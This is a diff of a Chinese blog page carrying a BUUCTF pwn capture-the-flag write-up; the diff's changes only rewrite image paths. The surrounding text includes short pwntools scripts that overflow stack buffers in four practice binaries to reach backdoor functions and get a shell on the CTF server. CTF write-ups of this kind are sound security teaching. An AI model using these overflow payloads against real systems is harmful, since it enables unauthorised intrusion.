@@ -23,20 +23,20 @@
 <meta property="og:site_name" content="M4gne51um&#39;s blog">
 <meta property="og:description" content="buuctf-pwn  rip&#x2F;warmup_csaw_2016&#x2F;ciscn_2019_n_1&#x2F;jarvisoj_level0  --writeup">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="http://example.com/rip1.png">
-<meta property="og:image" content="http://example.com/rip3.png">
-<meta property="og:image" content="http://example.com/rip2.png">
-<meta property="og:image" content="http://example.com/warmup1.png">
-<meta property="og:image" content="http://example.com/warmup2.png">
-<meta property="og:image" content="http://example.com/ciscn1.png">
-<meta property="og:image" content="http://example.com/ciscn2.png">
-<meta property="og:image" content="http://example.com/level1.png">
-<meta property="og:image" content="http://example.com/level2.png">
+<meta property="og:image" content="http://example.com/2021/02/10/Buuctf-pwn-writeup-0/rip1.png">
+<meta property="og:image" content="http://example.com/2021/02/10/Buuctf-pwn-writeup-0/rip3.png">
+<meta property="og:image" content="http://example.com/2021/02/10/Buuctf-pwn-writeup-0/rip2.png">
+<meta property="og:image" content="http://example.com/2021/02/10/Buuctf-pwn-writeup-0/warmup1.png">
+<meta property="og:image" content="http://example.com/2021/02/10/Buuctf-pwn-writeup-0/warmup2.png">
+<meta property="og:image" content="http://example.com/2021/02/10/Buuctf-pwn-writeup-0/ciscn1.png">
+<meta property="og:image" content="http://example.com/2021/02/10/Buuctf-pwn-writeup-0/ciscn2.png">
+<meta property="og:image" content="http://example.com/2021/02/10/Buuctf-pwn-writeup-0/level1.png">
+<meta property="og:image" content="http://example.com/2021/02/10/Buuctf-pwn-writeup-0/level2.png">
 <meta property="article:published_time" content="2021-02-10T12:05:15.000Z">
 <meta property="article:modified_time" content="2021-03-27T13:49:22.147Z">
 <meta property="article:author" content="Magnesium">
 <meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:image" content="http://example.com/rip1.png">
+<meta name="twitter:image" content="http://example.com/2021/02/10/Buuctf-pwn-writeup-0/rip1.png">
   
   
   
@@ -287,11 +287,11 @@
                 
                 <h2 id="test-your-nc"><a href="#test-your-nc" class="headerlink" title="test_your_nc"></a>test_your_nc</h2><p>直接nc就能getshell</p>
 <h2 id="rip"><a href="#rip" class="headerlink" title="rip"></a>rip</h2><p>下载二进制文件，发现有&#x2F;bin&#x2F;sh</p>
-<p><img src="/rip1.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2021/02/10/Buuctf-pwn-writeup-0/rip1.png" srcset="/img/loading.gif" lazyload></p>
 <p>找到后门函数</p>
-<p><img src="/rip3.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2021/02/10/Buuctf-pwn-writeup-0/rip3.png" srcset="/img/loading.gif" lazyload></p>
 <p>很明显的栈溢出，覆盖返回地址为后门函数即可</p>
-<p><img src="/rip2.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2021/02/10/Buuctf-pwn-writeup-0/rip2.png" srcset="/img/loading.gif" lazyload></p>
 <p>exp</p>
 <figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-keyword">from</span> pwn import *<br><span class="hljs-attribute">sh</span>=remote(&#x27;node3.buuoj.cn&#x27;,26443)<br><span class="hljs-attribute">payload</span>=<span class="hljs-string">&#x27;a&#x27;</span>*23+p64(0x401187)<br>sh.send(payload)<br>sh.interactive()<br></code></pre></td></tr></table></figure>
 
@@ -300,9 +300,9 @@
 
 
 <h2 id="warmup-csaw-2016"><a href="#warmup-csaw-2016" class="headerlink" title="warmup_csaw_2016"></a>warmup_csaw_2016</h2><p>ida打开发现后门函数，直接打开flag.txt，就不用getshell了</p>
-<p><img src="/warmup1.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2021/02/10/Buuctf-pwn-writeup-0/warmup1.png" srcset="/img/loading.gif" lazyload></p>
 <p>main函数</p>
-<p><img src="/warmup2.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2021/02/10/Buuctf-pwn-writeup-0/warmup2.png" srcset="/img/loading.gif" lazyload></p>
 <p>sprint会打印后门函数的地址，gets函数造成栈溢出</p>
 <p>exp</p>
 <figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs vim">from pwn import *<br><span class="hljs-keyword">sh</span>=remote(<span class="hljs-string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="hljs-number">29685</span>)<br><span class="hljs-keyword">sh</span>.recvuntil(<span class="hljs-string">&#x27;WOW:&#x27;</span>)<br>addr=<span class="hljs-keyword">sh</span>.recvuntil(<span class="hljs-string">&#x27;\n&#x27;</span>)[:-<span class="hljs-number">1</span>]<br>payload=<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">72</span>+p64(<span class="hljs-keyword">int</span>(addr,<span class="hljs-number">16</span>))<br><span class="hljs-keyword">sh</span>.send(payload)<br><span class="hljs-keyword">sh</span>.interactive()<br></code></pre></td></tr></table></figure>
@@ -312,9 +312,9 @@
 
 
 <h2 id="ciscn-2019-n-1"><a href="#ciscn-2019-n-1" class="headerlink" title="ciscn_2019_n_1"></a>ciscn_2019_n_1</h2><p>ida</p>
-<p><img src="/ciscn1.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2021/02/10/Buuctf-pwn-writeup-0/ciscn1.png" srcset="/img/loading.gif" lazyload></p>
 <p>gets造成栈溢出</p>
-<p><img src="/ciscn2.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2021/02/10/Buuctf-pwn-writeup-0/ciscn2.png" srcset="/img/loading.gif" lazyload></p>
 <p>覆盖返回地址exp</p>
 <figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-keyword">from</span> pwn import *<br><span class="hljs-attribute">sh</span>=remote(&#x27;node3.buuoj.cn&#x27;,27073)<br><span class="hljs-attribute">payload</span>=<span class="hljs-string">&#x27;a&#x27;</span>*56+p64(0x4006BE)<br>sh.send(payload)<br>sh.interactive()<br></code></pre></td></tr></table></figure>
 
@@ -324,8 +324,8 @@
 
 
 <h2 id="jarvisoj-level0"><a href="#jarvisoj-level0" class="headerlink" title="jarvisoj_level0"></a>jarvisoj_level0</h2><p>ida</p>
-<p><img src="/level1.png" srcset="/img/loading.gif" lazyload></p>
-<p><img src="/level2.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2021/02/10/Buuctf-pwn-writeup-0/level1.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2021/02/10/Buuctf-pwn-writeup-0/level2.png" srcset="/img/loading.gif" lazyload></p>
 <p>buf长度128，读入0x200可溢出</p>
 <p>exp</p>
 <figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-keyword">from</span> pwn import *<br><span class="hljs-attribute">sh</span>=remote(&#x27;node3.buuoj.cn&#x27;,26339)<br><span class="hljs-attribute">payload</span>=<span class="hljs-string">&#x27;a&#x27;</span>*136+p64(0x400596)<br>sh.send(payload)<br>sh.interactive()<br></code></pre></td></tr></table></figure>
